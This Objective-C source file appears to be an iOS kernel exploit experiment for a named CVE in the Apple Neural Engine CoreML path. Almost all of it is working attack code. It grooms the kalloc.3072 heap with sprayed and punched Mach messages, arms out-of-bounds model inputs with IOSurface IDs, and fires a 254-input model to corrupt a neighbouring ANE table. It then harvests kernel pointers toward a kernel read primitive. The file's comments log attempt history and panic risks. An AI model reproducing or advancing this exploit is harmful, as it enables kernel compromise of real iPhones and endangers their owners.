//
//  P073AneSecondTable.m
//  P007OpenOnly — CVE-2026-43748 conversion experiment (PATH B).
//
//  Design: Lum1na P044 v46 "second ANE MemoryMap table in the punched-hole
//  LIFO", ported to P007 conventions, plus two passive detectors v46 lacks:
//    D1. IOSurface marker spray — OOB-range addchain inputs (i>=192) are armed
//        with OUR sprayed IOSurface IDs. If the 254 fill smashes table_small
//        and table_small's MemoryMapRequest consumes the forged records, the
//        ANE maps/writes OUR surface -> marker diff = consume signal.
//    D2. Live simple sentinel extras (0x820 kdata) sprayed before+after the
//        hole run, never punched — post-fire recv harvest catches a stray
//        fill when the second-table adjacency missed (FILL HIT oracle).
//
//  Geometry (notes 41/46/51, insn-locked on 23F77):
//    CheckandPrewire 0x874c070: table[i*0x10+0]=surfaceId, +4=symbol,
//    +8=0x100000001. NO cmp #0x80 in the fill. Records 192..253 (n>=0xC1)
//    land in the NEXT kalloc.3072 chunk (first 0x3E0). MemoryMap then
//    restores +0x800..+0x814 and fails count>0x80 with 0xe00002c2 — the
//    254's own MemoryMap consumes nothing. The consumer is table_small.
//
//  Sealed history (do not re-add): fat type-3 OOL neighbor recv is
//  PACGA-fatal (v45, ipc_kmsg.c:460). Punching fat OOL MAFs 16384s in
//  other processes (v42). Type-1 simple extra is payload-only read-back.
//
//  Bar (notes 89/99): conversion=YES is desc_type_forged OR
//  (body_forged AND kptr). Occupancy/FILL HIT alone = NO. hasKread stays
//  NO until commitSlide kread32(kbase)==MH_MAGIC_64.
//
//  Isolation: ONE TAP per force-quit. PANIC POSSIBLE at fire. Per-line
//  POSIX write + F_FULLFSYNC so the log survives the panic.
//

#import "P073AneSecondTable.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <stdarg.h>
#import <string.h>
#import <unistd.h>

#define P073_BUILD @"p073-second-table-v1"

/* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
#define P073_MSG_SIZE     0x7FCu
#define P073_KDATA_SIZE   (P073_MSG_SIZE + 0x24u)
#define P073_N_HOLES      128u   /* consecutive simples, ALL punched (LIFO) */
#define P073_N_SENT       64u    /* live sentinels before AND after holes */
#define P073_MAGIC        0x50730000u  /* "P073" */

/* fire geometry — records 192..253 are OOB (offset >= 0xC00) */
#define P073_INPUTS       254u
#define P073_OOB_FIRST    192u
#define P073_ADDCHAIN     @"XVRC27_254in_1out_addchain"
#define P073_SMALL        @"simple_1in1out"
#define P073_HEADSTART_US 50000u

/* IOSurface marker spray */
#define P073_N_SURF       48u
#define P073_SURF_MARK    0x53u

/* fill fingerprint (record flags qword) */
#define P073_FILL_FLAG    0x0000000100000001ULL
#define P073_KVA_MIN      0xFFFFFF8000000000ULL
#define P073_KVA_MAX      0xFFFFFFFFFF000000ULL

_Static_assert(P073_KDATA_SIZE == 0x820, "kdata must match ANE table class");

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p073_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*p073_iosGetID_t)(IOSurfaceRef);
typedef void *(*p073_iosBase_t)(IOSurfaceRef);
typedef size_t (*p073_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p073_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    mach_port_t port;
    uint32_t    index;
    BOOL        alive;
} p073_held_t;

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
    size_t       allocSize;
} p073_surf_t;

static int g_p073_fd = -1;
static NSMutableString *g_p073_buf;

static void p073_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P073AneSecondTable class]) {
        if (g_p073_buf) [g_p073_buf appendString:out];
        if (g_p073_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p073_fd, s, strlen(s));
                fcntl(g_p073_fd, F_FULLFSYNC);   /* panic-surviving flush per line */
            }
        }
    }
}

#pragma mark - IOSurface marker spray (D1)

static p073_iosCreate_t  s_iosCreate;
static p073_iosGetID_t   s_iosGetID;
static p073_iosBase_t    s_iosBase;
static p073_iosAllocSz_t s_iosAllocSz;
static p073_iosLock_t    s_iosLock;
static p073_iosLock_t    s_iosUnlock;

static BOOL p073_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p073_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (p073_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosBase    = (p073_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p073_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p073_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p073_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosBase && s_iosAllocSz && s_iosLock && s_iosUnlock;
}

static CFNumberRef p073_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef p073_surface_create(void) {
    CFNumberRef w = p073_cfnum(64), h = p073_cfnum(64);
    CFNumberRef bpe = p073_cfnum(4), fmt = p073_cfnum(0x42475241); /* BGRA */
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { w, h, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

static uint32_t p073_surface_fill_markers(p073_surf_t *arr, uint32_t n) {
    uint32_t ok = 0;
    for (uint32_t i = 0; i < n; i++) {
        IOSurfaceRef s = p073_surface_create();
        if (!s) { p073_log(@"  surf[%u] create FAILED", i); continue; }
        arr[ok].surf = s;
        arr[ok].sid = s_iosGetID(s);
        arr[ok].allocSize = s_iosAllocSz(s);
        void *base = s_iosBase(s);
        if (base && arr[ok].allocSize > 0 && arr[ok].allocSize <= (16UL << 20)) {
            if (s_iosLock(s, 0, NULL) == KERN_SUCCESS) {
                memset(base, P073_SURF_MARK, arr[ok].allocSize);
                s_iosUnlock(s, 0, NULL);
            }
        }
        ok++;
    }
    return ok;
}

/* returns count of surfaces whose bytes differ from the marker */
static uint32_t p073_surface_scan(p073_surf_t *arr, uint32_t n) {
    uint32_t touched = 0;
    for (uint32_t i = 0; i < n; i++) {
        if (!arr[i].surf) continue;
        void *base = s_iosBase(arr[i].surf);
        if (!base) continue;
        size_t sz = arr[i].allocSize;
        if (sz == 0 || sz > (16UL << 20)) continue;
        uint32_t diff = 0;
        uint8_t first[32];
        memset(first, 0, sizeof(first));
        if (s_iosLock(arr[i].surf, 0, NULL) != KERN_SUCCESS) continue;
        const uint8_t *b = (const uint8_t *)base;
        memcpy(first, b, 32);
        for (size_t k = 0; k < sz; k++) {
            if (b[k] != P073_SURF_MARK) { diff++; if (diff >= 64) break; }
        }
        s_iosUnlock(arr[i].surf, 0, NULL);
        if (diff) {
            touched++;
            p073_log(@"  [+] SURFACE TOUCHED sid=%u idx=%u diff>=%u first32 %02x %02x %02x %02x %02x %02x %02x %02x",
                     arr[i].sid, i, diff,
                     first[0], first[1], first[2], first[3],
                     first[4], first[5], first[6], first[7]);
            p073_log(@"      first32(cont) %02x %02x %02x %02x %02x %02x %02x %02x ...",
                     first[8], first[9], first[10], first[11],
                     first[12], first[13], first[14], first[15]);
            [[P007Board shared] recordEvent:@"p073_surface_touched"
                                       kind:@"consume"
                                     detail:[NSString stringWithFormat:@"sid=%u idx=%u diff>=%u",
                                             arr[i].sid, i, diff]
                                     source:@"p073"];
        }
    }
    return touched;
}

#pragma mark - kmsg spray (P034 contract)

static mach_port_t p073_make_port(void) {
    mach_port_t port = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS)
        return MACH_PORT_NULL;
    if (mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
        mach_port_deallocate(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    return port;
}

static BOOL p073_send_simple(mach_port_t port, uint32_t index) {
    uint8_t buf[P073_MSG_SIZE];
    memset(buf, 0xA5, sizeof(buf));
    uint8_t *body = buf + sizeof(mach_msg_header_t);
    memcpy(body, "P073", 4);
    uint32_t tag = index ^ P073_MAGIC;
    memcpy(body + 4, &tag, 4);
    mach_msg_header_t *h = (mach_msg_header_t *)buf;
    h->msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    h->msgh_size        = P073_MSG_SIZE;
    h->msgh_remote_port = port;
    h->msgh_local_port  = MACH_PORT_NULL;
    h->msgh_id          = (int)(P073_MAGIC | (int)(index & 0xFFFFu));
    return mach_msg(h, MACH_SEND_MSG, P073_MSG_SIZE, 0,
                    MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) == MACH_MSG_SUCCESS;
}

/* recv one simple extra; 1 = clean marker, 0 = gone/timeout, -1 = MUTATED */
static int p073_harvest_one(p073_held_t *v, const char *label) {
    uint8_t rbuf[P073_MSG_SIZE + 64];
    memset(rbuf, 0, sizeof(rbuf));
    mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
    mach_msg_return_t mr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                    (mach_msg_size_t)sizeof(rbuf), v->port, 0, MACH_PORT_NULL);
    if (mr == MACH_RCV_TIMED_OUT) return 0;
    if (mr != MACH_MSG_SUCCESS) {
        p073_log(@"  [*] %s[%u] recv mr=0x%x (gone)", label, v->index, mr);
        return 0;
    }
    uint8_t *body = rbuf + sizeof(mach_msg_header_t);
    uint32_t expect = v->index ^ P073_MAGIC;
    BOOL markerOK = (memcmp(body, "P073", 4) == 0 && memcmp(body + 4, &expect, 4) == 0);
    uint64_t *q = (uint64_t *)body;
    uint32_t nq = (P073_MSG_SIZE - (uint32_t)sizeof(mach_msg_header_t)) / 8;
    uint32_t fillHits = 0, kptrs = 0;
    long long firstFlag = -1;
    for (uint32_t w = 0; w < nq; w++) {
        if (q[w] == P073_FILL_FLAG) {
            fillHits++;
            if (firstFlag < 0) firstFlag = w * 8;
        }
        if (q[w] >= P073_KVA_MIN && q[w] < P073_KVA_MAX) {
            kptrs++;
            [[P007Board shared] recordCandidate:q[w]
                                           kind:(((q[w] >> 32) == 0xFFFFFFF0ULL) ? @"text_ptr" : @"heap_ptr")
                                         source:@"p073_harvest"];
        }
    }
    if (!markerOK || fillHits) {
        p073_log(@"  [+] FILL HIT %s[%u] idx=%u markerOK=%d fillFlags=%u firstFlagOff=%lld kptrs=%u",
                 label, v->index, v->index, markerOK, fillHits, firstFlag, kptrs);
        /* dump first 4 smashed records so the input->record mapping is measurable */
        for (uint32_t r = 0; r < 4; r++) {
            uint32_t sid = 0, sym = 0; uint64_t flg = 0;
            memcpy(&sid, body + r * 0x10 + 0, 4);
            memcpy(&sym, body + r * 0x10 + 4, 4);
            memcpy(&flg, body + r * 0x10 + 8, 8);
            p073_log(@"      record[%u] surfaceId=0x%08x symbol=0x%08x flags=0x%016llx",
                     r, sid, sym, flg);
        }
        [[P007Board shared] recordEvent:@"p073_fill_hit"
                                   kind:@"occupancy"
                                 detail:[NSString stringWithFormat:@"%s[%u] fillFlags=%u kptrs=%u",
                                         label, v->index, fillHits, kptrs]
                                 source:@"p073"];
        return -1;
    }
    return 1;
}

#pragma mark - CoreML

static NSURL *p073_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    u = [b URLForResource:name withExtension:@"mlpackage"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlmodel"];
}

@implementation P073AneSecondTable

+ (NSString *)tap {
    g_p073_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p073_ane_second_table_log.txt"];
    g_p073_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p073_log(@"=== p073 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P073_BUILD);
    p073_log(@"43748 conversion: second ANE MemoryMap table as the 3072 neighbor (v46 parity).");
    p073_log(@"Bar: conversion=YES is desc_type_forged OR (body_forged AND kptr). Occupancy != conversion.");
    p073_log(@"No fat type-3 (v45 PACGA). No fat punch (v42 16384 MAF). One TAP per force-quit.");
    p073_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p073"];
    if (stop) {
        p073_log(@"%@", stop);
        if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
        NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
    }
    p073_log(@"%@", [LabDeviceProfile identBlock]);

    if ([LabDeviceProfile sku] == LabSkuA12X_23G71) {
        p073_log(@"SKIP — 23G71 CheckandPrewire fill_cap: >=0x80 -> 0xe00002c2. 254 fire is A14-only.");
        p073_log(@"=== VERDICT === skip (fill_cap). hasKread=NO.");
        if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
        NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
    }

    /* ---- anchor (informational; aio84530 heap leak recorded by P063) ---- */
    uint64_t anchor = 0;
    for (NSDictionary *e in [[P007Board shared].leaks reverseObjectEnumerator]) {
        if (![e isKindOfClass:[NSDictionary class]]) continue;
        NSString *src = [e[@"source"] isKindOfClass:[NSString class]] ? e[@"source"] : @"";
        if (![src isEqualToString:@"aio84530"]) continue;
        anchor = strtoull([[e[@"va"] description] UTF8String] ?: "0x0", NULL, 16);
        if (anchor) break;
    }
    p073_log(@"anchor=%@ (heap leak; informational only — NOT armed this build)",
             anchor ? [NSString stringWithFormat:@"0x%016llx", anchor] : @"NONE");

    /* ---- D1: IOSurface marker spray FIRST (keeps 3072 band clean) ---- */
    p073_surf_t *surfs = calloc(P073_N_SURF, sizeof(p073_surf_t));
    uint32_t nSurf = 0;
    if (p073_resolve_iosurface()) {
        nSurf = p073_surface_fill_markers(surfs, P073_N_SURF);
    }
    p073_log(@"[D1] IOSurface markers: %u/%u created, filled 0x%02x", nSurf, P073_N_SURF, P073_SURF_MARK);
    if (nSurf == 0) {
        p073_log(@"[-] no surfaces — D1 disarmed, continuing with D2 only");
    } else {
        NSMutableString *idline = [NSMutableString stringWithString:@"  sids:"];
        for (uint32_t i = 0; i < nSurf && i < 16; i++)
            [idline appendFormat:@" %u", surfs[i].sid];
        if (nSurf > 16) [idline appendFormat:@" ... (%u total)", nSurf];
        p073_log(@"%@", idline);
    }

    /* ---- models ---- */
    NSURL *url254 = p073_model_url(P073_ADDCHAIN);
    NSURL *urlSmall = p073_model_url(P073_SMALL);
    if (!url254 || !urlSmall) {
        p073_log(@"[-] model missing: addchain=%@ small=%@", url254 ? @"ok" : @"MISSING",
                 urlSmall ? @"ok" : @"MISSING");
        p073_log(@"=== VERDICT === abort (no model). hasKread=NO.");
        for (uint32_t i = 0; i < nSurf; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
        NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
    }
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = MLComputeUnitsAll;
    NSError *err = nil;
    MLModel *model254 = [MLModel modelWithContentsOfURL:url254 configuration:cfg error:&err];
    if (!model254) {
        p073_log(@"[-] addchain load FAILED: %@", err.localizedDescription ?: @"-");
    }
    MLModelConfiguration *cfgSmall = [[MLModelConfiguration alloc] init];
    cfgSmall.computeUnits = MLComputeUnitsCPUAndNeuralEngine;
    NSError *errS = nil;
    MLModel *modelSmall = [MLModel modelWithContentsOfURL:urlSmall configuration:cfgSmall error:&errS];
    if (!modelSmall) {
        p073_log(@"[-] small load FAILED: %@", errS.localizedDescription ?: @"-");
    }
    if (!model254 || !modelSmall) {
        p073_log(@"=== VERDICT === abort (model load). hasKread=NO.");
        for (uint32_t i = 0; i < nSurf; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
        NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
    }
    p073_log(@"[+] models loaded: addchain (All) + simple_1in1out (CPU+NE)");

    /* ---- features: in-bounds i+1; OOB (>=192) armed with OUR surface ids ---- */
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < P073_INPUTS; i++) {
        MLMultiArray *arr = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                       dataType:MLMultiArrayDataTypeDouble
                                                          error:nil];
        if (!arr) break;
        double val;
        if (i >= P073_OOB_FIRST && nSurf > 0) {
            val = (double)surfs[(i - P073_OOB_FIRST) % nSurf].sid;
        } else {
            val = (double)(i + 1);
        }
        arr[0] = @(val);
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:arr];
    }
    MLDictionaryFeatureProvider *provider =
        [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:&err];
    if (!provider) {
        p073_log(@"[-] feature provider FAILED: %@", err.localizedDescription ?: @"-");
        p073_log(@"=== VERDICT === abort (features). hasKread=NO.");
        for (uint32_t i = 0; i < nSurf; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
        NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
    }
    p073_log(@"[+] features armed: x_000..x_191 = i+1; x_192..x_253 = our IOSurface ids (D1 consume test)");

    MLMultiArray *smallArr = [[MLMultiArray alloc] initWithShape:@[ @1, @1 ]
                                                        dataType:MLMultiArrayDataTypeFloat32
                                                           error:nil];
    if (smallArr) smallArr[0] = @(3.0);
    MLDictionaryFeatureProvider *smallFP = nil;
    if (smallArr) {
        MLFeatureValue *fv = [MLFeatureValue featureValueWithMultiArray:smallArr];
        if (fv) {
            smallFP = [[MLDictionaryFeatureProvider alloc]
                initWithDictionary:@{ @"input": fv } error:nil];
        }
    }
    if (!smallFP) p073_log(@"[!] small feature provider FAILED — fire will abort");

    /* ---- spray: 64 sentinels, 128 holes, 64 sentinels (all 0x820 kdata) ---- */
    p073_held_t *sentPre  = calloc(P073_N_SENT, sizeof(p073_held_t));
    p073_held_t *holes    = calloc(P073_N_HOLES, sizeof(p073_held_t));
    p073_held_t *sentPost = calloc(P073_N_SENT, sizeof(p073_held_t));
    uint32_t nPre = 0, nHoles = 0, nPost = 0;

    for (uint32_t i = 0; i < P073_N_SENT; i++) {
        mach_port_t p = p073_make_port();
        if (p == MACH_PORT_NULL) break;
        sentPre[nPre].port = p; sentPre[nPre].index = 0x1000u | i; sentPre[nPre].alive = YES;
        if (!p073_send_simple(p, sentPre[nPre].index)) break;
        nPre++;
    }
    for (uint32_t i = 0; i < P073_N_HOLES; i++) {
        mach_port_t p = p073_make_port();
        if (p == MACH_PORT_NULL) break;
        holes[nHoles].port = p; holes[nHoles].index = 0x2000u | i; holes[nHoles].alive = YES;
        if (!p073_send_simple(p, holes[nHoles].index)) break;
        nHoles++;
    }
    for (uint32_t i = 0; i < P073_N_SENT; i++) {
        mach_port_t p = p073_make_port();
        if (p == MACH_PORT_NULL) break;
        sentPost[nPost].port = p; sentPost[nPost].index = 0x3000u | i; sentPost[nPost].alive = YES;
        if (!p073_send_simple(p, sentPost[nPost].index)) break;
        nPost++;
    }
    p073_log(@"[+] spray: sentPre=%u holes=%u sentPost=%u (kdata=0x820 each)", nPre, nHoles, nPost);

    if (nHoles >= 2 && smallFP) {

    /* ---- punch ALL holes in allocation order (LIFO: hole[127] on top) ---- */
    {
        uint32_t punched = 0;
        for (uint32_t i = 0; i < nHoles; i++) {
            uint8_t rbuf[P073_MSG_SIZE + 64];
            memset(rbuf, 0, sizeof(rbuf));
            mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
            mach_msg_return_t mr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                            (mach_msg_size_t)sizeof(rbuf),
                                            holes[i].port, 0, MACH_PORT_NULL);
            if (mr == MACH_MSG_SUCCESS || mr == MACH_RCV_TOO_LARGE) {
                holes[i].alive = NO;
                punched++;
            }
        }
        p073_log(@"[+] punched %u/%u holes — magazine LIFO armed for two tables", punched, nHoles);
    }

    /* ---- FIRE: small table first (in-flight), then 254 addchain ---- */
    p073_log(@">>> FIRE: small 1-in/1-out in-flight (table_small pops LIFO top),");
    p073_log(@">>>       254 addchain after %uus headstart (table_254 pops next).", P073_HEADSTART_US);
    p073_log(@">>>       If adjacent: table_254+0xc00 == table_small. PANIC POSSIBLE.");

    {
        dispatch_semaphore_t smallDone = dispatch_semaphore_create(0);
        __block CFAbsoluteTime tSmall0 = 0, tSmall1 = 0;
        __block NSString *smallResult = @"no-run";
        CFAbsoluteTime tKick = CFAbsoluteTimeGetCurrent();
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            tSmall0 = CFAbsoluteTimeGetCurrent();
            NSError *pErr = nil;
            id<MLFeatureProvider> pred = [modelSmall predictionFromFeatures:smallFP error:&pErr];
            tSmall1 = CFAbsoluteTimeGetCurrent();
            if (pred) {
                MLFeatureValue *outv = [pred featureValueForName:@"output"];
                MLMultiArray *outa = outv.multiArrayValue;
                double got = outa ? outa[0].doubleValue : NAN;
                smallResult = [NSString stringWithFormat:@"ok output=%.6f (clean=~6.0)", got];
            } else {
                smallResult = [NSString stringWithFormat:@"FAIL %@/%ld",
                               pErr.domain ?: @"-", (long)pErr.code];
            }
            dispatch_semaphore_signal(smallDone);
        });
        usleep(P073_HEADSTART_US);

        NSError *err254 = nil;
        CFAbsoluteTime t254_0 = CFAbsoluteTimeGetCurrent();
        id<MLFeatureProvider> pred254 = [model254 predictionFromFeatures:provider error:&err254];
        CFAbsoluteTime t254_1 = CFAbsoluteTimeGetCurrent();
        p073_log(@"[*] 254 predict %@ t=%.0fms (kick->ret)",
                 pred254 ? @"returned" : @"FAILED", (t254_1 - t254_0) * 1000.0);
        if (pred254) {
            MLFeatureValue *y = [pred254 featureValueForName:@"y"];
            MLMultiArray *ya = y.multiArrayValue;
            p073_log(@"[*] 254 y[0]=%@ (addchain: prediction OK is UNEXPECTED — check model)",
                     ya ? ya[0] : @"<no y>");
        } else {
            p073_log(@"[*] 254 error: %@ %ld — fill may STILL have fired (v42: error -1 still filled)",
                     err254.domain ?: @"-", (long)err254.code);
        }

        long waitRes = dispatch_semaphore_wait(smallDone, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
        if (waitRes != 0) {
            p073_log(@"[*] small predict: STILL IN-FLIGHT after 10s wait (hang = consume anomaly?)");
        } else {
            p073_log(@"[*] small predict: %@ (start t+%.0fms, dur %.0fms)",
                     smallResult,
                     (tSmall0 - tKick) * 1000.0, (tSmall1 - tSmall0) * 1000.0);
        }
        p073_log(@"[*] small ANOMALY check: error/hang/wrong-output => table_small consumed smashed records");
    }

    /* ---- D1 scan: did the ANE touch our surfaces? ---- */
    uint32_t touched = p073_surface_scan(surfs, nSurf);
    p073_log(@"[D1] surface scan: %u touched of %u", touched, nSurf);

    /* ---- D2 harvest: sentinel extras (safe: simple recv, payload-only) ---- */
    uint32_t mut = 0, clean = 0;
    for (uint32_t i = 0; i < nPre; i++) {
        if (!sentPre[i].alive) continue;
        int r = p073_harvest_one(&sentPre[i], "sentPre");
        if (r < 0) mut++; else if (r > 0) clean++;
    }
    for (uint32_t i = 0; i < nPost; i++) {
        if (!sentPost[i].alive) continue;
        int r = p073_harvest_one(&sentPost[i], "sentPost");
        if (r < 0) mut++; else if (r > 0) clean++;
    }
    p073_log(@"[D2] sentinel harvest: mutated=%u clean=%u", mut, clean);

    /* ---- verdict ---- */
    p073_log(@"=== VERDICT ===");
    if (touched > 0) {
        p073_log(@"conversion SIGNAL: ANE touched our IOSurface(s) — table_small consume of forged records.");
        p073_log(@"Next: identify WHICH sid landed (record dump), then passthrough model for exact control.");
        [[P007Board shared] recordEvent:@"p073_session" kind:@"conversion"
                                 detail:@"surface touched — consume signal" source:@"p073"];
    } else if (mut > 0) {
        p073_log(@"occupancy HIT only (sentinel fill). Adjacency missed table_small this run.");
        p073_log(@"conversion=NO. Bar untouched: desc_type_forged OR (body_forged AND kptr).");
        [[P007Board shared] recordEvent:@"p073_session" kind:@"occupancy"
                                 detail:@"sentinel FILL HIT, no consume" source:@"p073"];
    } else {
        p073_log(@"MISS — no surface touch, no sentinel hit. Either adjacency missed into an");
        p073_log(@"unknown neighbor (check for IPS panic: CheckandPrewire+0x18c GZAlloc page-end,");
        p073_log(@"or [data.kalloc.3072] MAF in another process) or the fill did not fire.");
        [[P007Board shared] recordEvent:@"p073_session" kind:@"miss"
                                 detail:@"no touch no hit" source:@"p073"];
    }
    p073_log(@"hasKread=NO. kread32 registers only from a copyout of kernel bytes we did not write.");
    p073_log(@"One TAP per force-quit. Reboot if ANE/kmsg state is dirty.");

    } else {
        p073_log(@"[-] hole spray too small — abort before fire");
        p073_log(@"=== VERDICT === abort (spray). hasKread=NO.");
    }

    for (uint32_t i = 0; i < nPre; i++)
        if (sentPre[i].port != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), sentPre[i].port);
    for (uint32_t i = 0; i < nHoles; i++)
        if (holes[i].port != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), holes[i].port);
    for (uint32_t i = 0; i < nPost; i++)
        if (sentPost[i].port != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), sentPost[i].port);
    free(sentPre); free(holes); free(sentPost);
    for (uint32_t i = 0; i < nSurf; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
    free(surfs);

    if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
    NSString *ret = g_p073_buf;
    g_p073_buf = nil;
    return ret;
}

@end
